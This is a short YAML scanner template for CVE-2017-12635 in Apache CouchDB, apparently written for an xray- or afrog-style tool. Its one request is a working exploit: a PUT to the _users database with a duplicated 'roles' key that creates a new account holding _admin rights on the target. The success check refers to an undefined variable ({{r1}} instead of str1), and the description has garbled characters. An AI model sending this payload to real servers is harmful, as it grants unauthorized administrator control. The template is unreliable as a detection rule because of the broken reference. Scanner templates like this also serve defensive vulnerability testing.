name: Apache CouchDB Remote Privilege Escalation CVE-2017-12635
manual: true
query: app="APACHE-CouchDB"
transport: http
set:
  str1: randomLowercase(32)
  str2: randomLowercase(64)
rules:
  r0:
    request:
      method: PUT
      path: /_users/org.couchdb.user:{{str1}}
      headers:
        Content-Type: application/json
      body: "                {\r\n                  \"type\": \"user\",\r\n                  \"name\":
        \"{{str1}}\",\r\n                  \"roles\": [\"_admin\"],\r\n                  \"roles\":
        [],\r\n                  \"password\": \"{{str2}}\"\r\n                }"
    expression: response.status == 201 && response.body.bcontains(b"org.couchdb.user:{{r1}}")
expression: r0()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-12635
  - https://github.com/assalielmehdi/CVE-2017-12635
  description: Apache CouchDBâ„¢ lets you access your data where you need it. The Couch
    Replication Protocol is implemented in a variety of projects and products that
    span every imaginable computing environment from globally distributed server-clusters,
    over mobile phones to web browsers.
  tags: Ultra vires
